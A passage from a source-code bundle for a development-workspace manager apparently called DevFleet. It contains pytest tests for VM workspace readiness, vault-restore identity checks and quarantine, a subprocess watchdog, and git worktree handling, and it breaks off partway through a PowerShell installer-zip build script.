def test_starting_dedicated_vm_cannot_open(monkeypatch, tmp_path):
    _project(tmp_path, 'vm-starting', {
        'slug': 'vm-starting',
        'runtime_isolation': 'vm',
        'runtime_type': 'vm',
        'runtime_provider': 'multipass-host-agent',
        'lifecycle_status': 'starting',
        'runtime_id': 'devfleet-project-vm-starting',
        'ssh_alias': 'devfleet-project-vm-starting',
    })
    monkeypatch.setattr(projects, 'SETTINGS', replace(SETTINGS, workspaces=tmp_path))
    monkeypatch.setattr(projects.VmRuntimeOperations, 'inspect', staticmethod(lambda *_: {'info': {'state': 'Starting'}}))
    monkeypatch.setattr(projects.VmRuntimeOperations, 'refresh', staticmethod(lambda *_: (_ for _ in ()).throw(AssertionError('refresh must wait for running state'))))

    result = projects.open_workspace('vm-starting')

    assert result['ok'] is False
    assert result['state'] == 'starting'
    assert 'starting' in result['error'].lower()


def test_running_ssh_ready_dedicated_vm_opens(monkeypatch, tmp_path):
    _project(tmp_path, 'vm-ready', {
        'slug': 'vm-ready',
        'runtime_isolation': 'vm',
        'runtime_type': 'vm',
        'runtime_provider': 'multipass-host-agent',
        'lifecycle_status': 'running',
        'runtime_id': 'devfleet-project-vm-ready',
        'runtime_address': '172.30.9.35',
        'ssh_alias': 'devfleet-project-vm-ready',
        'ssh_host_key_pinned': True,
        'ssh_authenticated': True,
        'ssh_validation_passed': True,
        'workspace_provisioned': True,
    })
    monkeypatch.setattr(projects, 'SETTINGS', replace(SETTINGS, workspaces=tmp_path))
    monkeypatch.setattr(projects.VmRuntimeOperations, 'inspect', staticmethod(lambda *_: {'info': {'state': 'Running'}}))
    monkeypatch.setattr(projects, 'running', lambda *_: True)

    result = projects.open_workspace('vm-ready')

    assert result['ok'] is True
    assert result['readiness']['ready'] is True
    assert result['ssh_alias'] == 'devfleet-project-vm-ready'

```


## FILE: source/tests/test_vault_metadata_identity_integration.py

SHA256: f5340252c6b2410b726c4529c51ecef9ec9aab60b41c5ca3cef989573668b9d3 | Bytes: 3801 | Git mode: 100644

```
import importlib.util
from importlib.machinery import SourceFileLoader
import pytest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]


def _broker():
    pytest.importorskip("pwd", reason="Vault broker is POSIX-only")
    spec = importlib.util.spec_from_loader("vault_broker", SourceFileLoader("vault_broker", str(ROOT / "linux" / "devfleet-vault-broker")))
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def test_broker_delegates_descriptor_safe_identity_to_installed_helper(monkeypatch, tmp_path):
    broker = _broker()
    calls = []

    class Result:
        returncode = 0

    monkeypatch.setattr(broker.subprocess, "run", lambda command, **kwargs: calls.append((command, kwargs)) or Result())
    assert broker._restored_identity_matches(tmp_path, "demo", "12345678-1234-1234-1234-123456789012")
    command, kwargs = calls[-1]
    assert command == ["python3", "-I", "/opt/devfleet/devfleet/metadata_io.py", "--identity", str(tmp_path), "demo", "12345678-1234-1234-1234-123456789012"]
    assert kwargs["stdin"] is broker.subprocess.DEVNULL
    assert kwargs["stdout"] is broker.subprocess.DEVNULL
    assert kwargs["stderr"] is broker.subprocess.DEVNULL


def test_broker_binds_transfer_identity_arguments(monkeypatch, tmp_path):
    broker = _broker()
    seen = []
    monkeypatch.setattr(broker.subprocess, "run", lambda command, **kwargs: seen.append(command) or type("R", (), {"returncode": 0})())
    assert broker._restored_identity_matches(tmp_path, "demo", "12345678-1234-1234-1234-123456789012", "12345678-1234-1234-1234-123456789013", "failover")
    assert seen[0][-2:] == ["12345678-1234-1234-1234-123456789013", "failover"]


def test_broker_rejects_standalone_canonical_action(monkeypatch):
    broker = _broker()
    with pytest.raises(broker.ProtocolError):
        broker._parse_request({"action": "restore-canonical", "project": "demo", "project_id": "12345678-1234-1234-1234-123456789012"})
    assert "restore-canonical" not in (ROOT / "linux" / "devfleet-vault-request").read_text(encoding="utf-8")


def test_broker_attempts_quarantine_on_invalid_recovered_identity(monkeypatch, tmp_path):
    broker = _broker()
    broker.WORKSPACES = tmp_path
    # Supply the external configuration precondition; never read real credentials.
    monkeypatch.setattr(broker.os, "access", lambda path, mode: path == "/etc/devfleet/restic.env")
    target = tmp_path / "demo-recovered-20260916-123456-deadbeef"
    target.mkdir()
    monkeypatch.setattr(broker, "_run_child", lambda *_args, **_kwargs: type("R", (), {"returncode": 0, "stdout": str(target) + "\n"})())
    monkeypatch.setattr(broker, "_restored_identity_matches", lambda *_args: False)
    quarantined = []
    monkeypatch.setattr(broker, "_quarantine_invalid_copy", lambda path, project: quarantined.append((path, project)) or True)
    result = broker._run_fixed_operation("restore-copy", "demo", "12345678-1234-1234-1234-123456789012")
    assert result["ok"] is False and quarantined == [(target, "demo")]


def test_restore_shell_uses_metadata_io_identity_cli():
    script = (ROOT / "linux" / "devfleet-restore-project").read_text(encoding="utf-8")
    assert "python3 -I /opt/devfleet/devfleet/metadata_io.py --identity" in script
    assert "jq -e --arg slug" not in script


def test_restore_shell_quarantines_unmarked_recovered_target_after_move():
    script = (ROOT / "linux" / "devfleet-restore-project").read_text(encoding="utf-8")
    assert 'if [[ "$mode" != --canonical ]] && ! workspace_identity_matches "$target"' in script
    assert 'vault-recovery-invalid-$stamp-$project' in script
    assert 'Recovered workspace identity failed; the unmarked copy was quarantined.' in script

```


## FILE: source/tests/test_verify_package_watchdog.py

SHA256: 51cb998ef256cd58f3c6f63c63d23aa330566f0f4030c7f7237eb962967c3d4c | Bytes: 974 | Git mode: 100644

```
import sys
from pathlib import Path

import pytest


TOOLS = Path(__file__).parents[1] / "tools"
sys.path.insert(0, str(TOOLS))
from verify_package import run_bounded  # noqa: E402


def test_verify_package_watchdog_allows_normal_success():
    result = run_bounded([sys.executable, "-c", "print('ok')"], timeout=5, label="normal test")
    assert result.returncode == 0
    assert result.stdout.strip() == "ok"


def test_verify_package_watchdog_reports_timeout():
    with pytest.raises(RuntimeError, match="timeout"):
        run_bounded([sys.executable, "-c", "import time; time.sleep(30)"], timeout=0.2, label="sleeping hook")


def test_verify_package_watchdog_reports_output_flood():
    with pytest.raises(RuntimeError, match="output limit"):
        run_bounded(
            [sys.executable, "-c", "import sys; sys.stdout.write('x' * 1000000); sys.stdout.flush()"],
            timeout=5,
            output_limit=4096,
            label="flooding hook",
        )

```


## FILE: source/tests/test_worktrees_and_v1_restore.py

SHA256: 7cf54e4291b6c4df1063afb2ab5113bf35b78498c8f035ac1633d3c41d7c3b2f | Bytes: 3037 | Git mode: 100644

```
import json,shutil,subprocess,uuid
from pathlib import Path
from devfleet import projects, workspace_archives
from devfleet.core import SETTINGS

ROOT=Path(__file__).resolve().parents[1]

def git(cwd,*args):
 return subprocess.run(['git',*args],cwd=cwd,text=True,capture_output=True,check=True)

def test_git_worktree_project_creation(monkeypatch):
 source=SETTINGS.workspaces/f'source-{uuid.uuid4().hex[:8]}'
 dest_slug=f'worktree-{uuid.uuid4().hex[:8]}'
 dest=SETTINGS.workspaces/dest_slug
 source.mkdir(parents=True)
 try:
  git(source,'init');git(source,'config','user.name','DevFleet Test');git(source,'config','user.email','devfleet@example.invalid')
  (source/'seed.txt').write_text('seed');git(source,'add','.');git(source,'commit','-m','seed');git(source,'branch','feature')
  monkeypatch.setattr(projects,'TEMPLATE_ROOT',ROOT/'templates')
  meta=projects.create_project(dest_slug,template='generic',worktree_source=source.name,worktree_branch='feature',use_ollama=False)
  assert meta['worktree'] and (dest/'.git').is_file() and json.loads((dest/'.devfleet/project.json').read_text())['identity']==dest_slug
 finally:
  if dest.exists():subprocess.run(['git','worktree','remove','--force',str(dest)],cwd=source,check=False)
  shutil.rmtree(source,ignore_errors=True);shutil.rmtree(dest,ignore_errors=True)

def test_v1_project_without_schema2_metadata_remains_discoverable(tmp_path):
 project=tmp_path/'legacy-project';project.mkdir()
 meta=projects.load_meta(project)
 assert meta['slug']=='legacy-project' and meta['template']=='existing'
 assert meta['runtime_provider']=='docker-compose' and meta['resource_profile']=='standard'
 assert meta['resource_limits']['memory_gb']==4.0 and meta['resource_limits']['cpus']==2.0

def test_canonical_vault_restore_quarantines_existing_v1_copy():
 text=(ROOT/'linux/devfleet-restore-project').read_text()
 assert 'transfer-replaced-' in text and 'mv -T --no-clobber -- "$target" "$quarantine"' in text
 assert 'Canonical restore could not quarantine the existing workspace.' in text

def test_workspace_restore_failure_restores_previous_canonical(tmp_path,monkeypatch):
 slug='rollback-fixture'
 source=tmp_path/slug;source.mkdir();(source/'old.txt').write_text('old');(source/'.devfleet').mkdir();(source/'.devfleet/project.json').write_text(json.dumps({'slug':slug,'schema_version':2}))
 archive=tmp_path/'backup.tar.gz'
 workspace_archives.create_workspace_archive(source,slug,archive)
 (source/'old.txt').write_text('original-must-survive')
 original=workspace_archives.inspect_workspace
 calls={'count':0}
 def fail_after_promotion(path):
  calls['count']+=1
  if calls['count'] == 1:
   raise RuntimeError('injected post-promotion failure')
  return original(path)
 monkeypatch.setattr(workspace_archives,'inspect_workspace',fail_after_promotion)
 try:
  workspace_archives.restore_workspace_archive(archive,source,slug)
 except RuntimeError:
  pass
 else:
  raise AssertionError('fault injection did not fail')
 assert (source/'old.txt').read_text() == 'original-must-survive'

```


## FILE: source/tools/Build-InstallerSourceZip.ps1

SHA256: 8b654e01e2be6f4faa42628be4168e9c349348a8dac29fa8cbf5d24bf86badcf | Bytes: 2625 | Git mode: 100644

```
[CmdletBinding()]
param(
    [Parameter(Mandatory)][string]$SourceRoot,
    [Parameter(Mandatory)][string]$InstallerRoot,
    [Parameter(Mandatory)][string]$OutputPath
)
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.IO.Compression, System.IO.Compression.FileSystem
$sourceRootResolved = (Resolve-Path -LiteralPath $SourceRoot).Path
$sourceCandidate = Join-Path $sourceRootResolved 'source'
$source = if (Test-Path -LiteralPath (Join-Path $sourceCandidate 'VERSION')) { (Resolve-Path -LiteralPath $sourceCandidate).Path } else { $sourceRootResolved }
$installer = (Resolve-Path -LiteralPath $InstallerRoot).Path
$output = [IO.Path]::GetFullPath($OutputPath)
New-Item -ItemType Directory -Force -Path ([IO.Path]::GetDirectoryName($output)) | Out-Null
if ([IO.File]::Exists($output)) { [IO.File]::Delete($output) }

$excluded = @(
    '\.git([\\/]|$)',
    '(^|[\\/])(bin|obj|node_modules|__pycache__|\.pytest_cache|\.test-runtime|\.venv[^\\/]*|test-images|outputs|audit|dotnet-sdk)([\\/]|$)',
    '(^|[\\/])DevFleet\.Setup([\\/])Payload([\\/]).*\.(tar\.gz|exe)$',
    '\.(vhd|vhdx|avhdx|iso|exe)$'
)
$seen = @{}
$zip = [IO.Compression.ZipFile]::Open($output, [IO.Compression.ZipArchiveMode]::Create)
try {
    foreach ($root in @($source, $installer)) {
        foreach ($file in Get-ChildItem -LiteralPath $root -Recurse -File | Sort-Object FullName) {
            $relative = ([Uri]::new(($root.TrimEnd('\') + '